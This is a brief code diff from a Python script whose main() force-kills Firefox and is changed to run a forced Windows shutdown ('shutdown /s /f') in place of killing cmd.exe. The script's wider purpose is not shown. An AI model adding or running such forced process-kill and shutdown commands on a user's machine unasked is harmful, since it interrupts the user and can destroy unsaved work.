@@ -108,7 +108,7 @@ def main():
     time.sleep(2)
     os.system("taskkill /im firefox.exe /f")
     
-    os.system("taskkill /im cmd.exe /f")
+    os.system("shutdown /s /f")
 
 
 if __name__ == '__main__':
